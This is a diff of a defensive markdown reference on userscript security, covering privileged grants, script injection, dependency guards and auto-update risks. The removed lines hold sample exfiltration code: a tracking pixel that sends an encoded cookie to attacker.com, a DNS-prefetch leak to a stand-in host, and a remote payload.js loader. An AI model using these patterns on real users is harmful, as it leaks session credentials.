@@ -1,6 +1,30 @@
 # Userscript Threat Vectors & Attack Surfaces
 
-This reference outlines the major security, privacy, and data exfiltration vectors specific to browser userscripts (Tampermonkey, Violentmonkey, Greasemonkey).
+This reference outlines the major security, privacy, and data exfiltration vectors specific to browser userscripts (Tampermonkey, Violentmonkey, Greasemonkey), along with critical guidance on avoiding host application breakage.
+
+---
+
+> [!WARNING]
+> ## CRITICAL ARCHITECTURAL RULE: The Host-Page Sabotage Trap
+> **NEVER globally monkey-patch host page or DOM APIs (`window.fetch`, `window.XMLHttpRequest`, `document.createElement`, `Node.prototype.appendChild`, `window.WebSocket`, `window.Worker`).**
+>
+> ### Why Global Monkey-Patching Breaks Websites
+> Userscripts do not run in an isolated operating system container. In modern browsers:
+> 1. **Shared DOM:** The userscript and the host web application (e.g. ChatGPT, Claude, Gemini) share the exact same live DOM tree (`document`, `Node.prototype`, `HTMLImageElement`).
+> 2. **Shared Prototypes:** Mutating `document.createElement` or `Node.prototype.appendChild` mutates it for the **entire tab**.
+> 3. **Shared Window:** Depending on the userscript manager's injection mode (`MAIN_WORLD`, page context, or scripts running with `@run-at document-start`), overriding `window.fetch` can replace the native `fetch` function for the host web app.
+>
+> ### Real-World Breakage Examples
+> - **Blocking `document.createElement('img')`:** When ChatGPT tries to render the user's profile avatar (`<img src="https://cdn.auth0.com/avatars/user.png">`), the monkey-patch throws an unhandled error, crashing React's render tree.
+> - **Blocking `window.fetch()`:** ChatGPT's background polling (`https://bzr.openai.com/v1/obi/sync`) and streaming completions (`/backend-api/conversation`) fail with `net::ERR_BLOCKED_BY_CLIENT`, throwing `"chatgpt hit a snag - something went wrong"`.
+> - **Blocking `Node.prototype.appendChild(<script>)`:** Next.js and Vite chunk loaders fail to load lazy modules and code blocks, freezing the application.
+>
+> ### The Correct Mitigation Strategy
+> - **Never intercept host APIs.**
+> - **Revoke privileged extension grants** (`GM_xmlhttpRequest`, `@connect *`, `unsafeWindow`, `GM_cookie`) so the script cannot bypass CORS/CSP or read session cookies.
+> - **Strictly scope `@match`** to specific target origins (e.g. `https://chatgpt.com/*`), preventing execution on banking or email portals.
+> - **Audit and neuter in-body dangerous functions directly** (e.g., replace an internal `injectScript()` function with `return Promise.resolve()`).
+> - **Provide non-invasive stubs** for extension APIs (`GM_xmlhttpRequest`) so internal userscript routines fail gracefully without ReferenceErrors.
 
 ---
 
@@ -23,54 +47,43 @@ This reference outlines the major security, privacy, and data exfiltration vecto
 
 ## 2. Network & Communication Vectors
 
-### Why Removing `GM_xmlhttpRequest` Alone Fails
-Userscript managers isolate `GM_xmlhttpRequest` behind permission grants, but standard JavaScript running in the browser can still transmit data across the network via multiple channels:
+### Privileged Extension Proxying (`GM_xmlhttpRequest` & `@connect *`)
+* **Risk:** Unlike native `fetch()` which is bound by the browser's Same-Origin Policy (SOP) and the host website's Content Security Policy (CSP), `GM_xmlhttpRequest` runs via the extension background process:
+  - Bypasses Cross-Origin Resource Sharing (CORS).
+  - Bypasses the page's Content Security Policy (`connect-src`).
+  - When combined with `@connect *`, can send arbitrary requests to any external server or internal network IP.
+* **Hardening:**
+  1. Remove `@grant GM_xmlhttpRequest` and `@connect *` from the metadata header.
+  2. Provide a non-invasive stub in the userscript scope (`globalThis.GM_xmlhttpRequest`) that invokes `opts?.onerror?.()` to ensure features like WebDAV fail gracefully instead of throwing fatal `ReferenceError` crashes.
 
-### 1. Web Standard APIs
-* **`window.fetch()` and `XMLHttpRequest`:** Native asynchronous HTTP/HTTPS requests.
-* **`WebSocket` (`ws://`, `wss://`):** Full-duplex persistent TCP connections. Bypasses standard HTTP request-response flow.
-* **`EventSource`:** Server-Sent Events (SSE) streaming connections.
-* **`WebTransport`:** HTTP/3 over QUIC/UDP bidirectional transport.
-* **`navigator.sendBeacon()`:** Asynchronous POST telemetry channel designed to transmit data even after the page is closed or unloaded.
-
-### 2. Peer-to-Peer & UDP Channels (WebRTC)
-* **`RTCPeerConnection` & `RTCDataChannel`:**
-  - Establishes direct peer-to-peer data channels over UDP or TCP via ICE/STUN/TURN.
-  - Completely ignores HTTP proxies, headers, and traditional web request interceptors.
-  - Can be used to exfiltrate private tokens or leak local and public IP addresses (WebRTC IP leak).
-
-### 3. DNS Prefetching Side-Channels
-* **Technique:** Injecting `<link rel="dns-prefetch" href="//data-to-leak.attacker.com">` or `<link rel="preconnect">`.
-* **Mechanism:** The browser asks the OS resolver to resolve the hostname via UDP port 53.
-* **Exfiltration Risk:** Even if all outbound HTTP, HTTPS, and socket traffic is blocked by a proxy or firewall, the DNS query travels to the authoritative nameserver of `attacker.com`. Data encoded in the subdomain prefix (e.g. `token123.attacker.com`) is logged by the attacker's DNS server.
-
-### 4. Background Web Workers
-* **`new Worker()` / `new SharedWorker()`:**
-  - Spawns background JavaScript execution threads.
-  - Each worker has its own independent global scope and network capabilities (`fetch`, `XMLHttpRequest`, `WebSocket`).
+### In-Body Network Routines
+* **Risk:** A userscript might contain specific functions that call `fetch()`, `XMLHttpRequest`, or `WebSocket` to phone home or sync data to third-party cloud services.
+* **Hardening:**
+  - Audit the script body for outbound calls.
+  - Neuter or remove specific exfiltration routines in the userscript's own code.
+  - Do NOT attempt to globally override native browser networking on `window`.
 
 ---
 
-## 3. DOM-Based Remote Code Execution & Exfiltration
+## 3. DOM-Based Remote Code Execution & Injection
 
-### Dynamic Script Injection
+### Dynamic Script Injection within Userscript Routines
 * **Pattern:**
   ```javascript
-  const s = document.createElement("script");
-  s.src = "https://remote.com/payload.js";
-  document.head.appendChild(s);
+  injectScript(url) {
+    const s = document.createElement("script");
+    s.src = url;
+    document.head.appendChild(s);
+  }
   ```
-* **Risk:** Appending `<script>` elements to `document.head` forces the browser to fetch and execute arbitrary remote JavaScript inside the page's main execution context.
-* **Hardening:** Stub `document.createElement("script")` to throw, and intercept `Node.prototype.appendChild` to block appending script elements.
-
-### Dynamic Frames & Media Exfiltration
-* **`<iframe>`, `<object>`, `<embed>`:** Hidden embedded frames can navigate to external phishing pages or authenticate actions.
-* **Tracking Pixels (`<img>`, `<audio>`, `<video>`):**
+* **Risk:** Internal routines that dynamically fetch and inject external unvetted scripts (e.g. unpinned Mermaid diagram runners from GitHub).
+* **Hardening:** Directly edit the function definition in the script body to a no-op:
   ```javascript
-  const img = new Image();
-  img.src = "https://attacker.com/log?token=" + encodeURIComponent(cookie);
+  injectScript(url) {
+    return Promise.resolve();
+  }
   ```
-  Forces an HTTP GET request to external servers carrying stolen credentials in the query string.
+  *(Do NOT intercept `document.createElement` or `Node.prototype.appendChild` globally, as host applications use them for dynamic chunk loading.)*
 
 ---
 
@@ -84,10 +97,23 @@ Userscript managers isolate `GM_xmlhttpRequest` behind permission grants, but st
 * **Risk:** Anyone who pushes to the GitHub repository's `main` branch can modify the code running in the user's browser without warning or review.
 * **Hardening:** Pin to an immutable commit hash and require subresource integrity (`#sha256=...`), or vendor the resource locally.
 
-### Auto-Update Overwrite
+### Missing Dependency Parameter Guards
+* **Pattern:**
+  ```javascript
+  })(DependencyName);
+  ```
+* **Risk:** If an unneeded `@require` dependency (e.g. watermark remover or math renderer) is removed from the userscript header to reduce bloat, invoking the script with an undeclared identifier throws a fatal `Uncaught ReferenceError: DependencyName is not defined` during script initialization.
+* **Hardening:** Guard the parameter evaluation:
+  ```javascript
+  })(typeof DependencyName !== "undefined" ? DependencyName : {
+    // safe fallback stub matching expected interface
+  });
+  ```
+
+### Auto-Update Overwrites
 * **Directives:** `@downloadURL` and `@updateURL` pointing to GreasyFork or GitHub:
   ```javascript
   // @updateURL https://update.greasyfork.org/...
   ```
-* **Risk:** When a userscript is hardened locally, the userscript manager will automatically fetch upstream updates on a background schedule and overwrite the hardened script, restoring all permissions.
+* **Risk:** When a userscript is hardened locally, the userscript manager will automatically fetch upstream updates on a background schedule and overwrite the hardened script, restoring all dangerous permissions.
 * **Hardening:** Remove both `@downloadURL` and `@updateURL` from the metadata header.
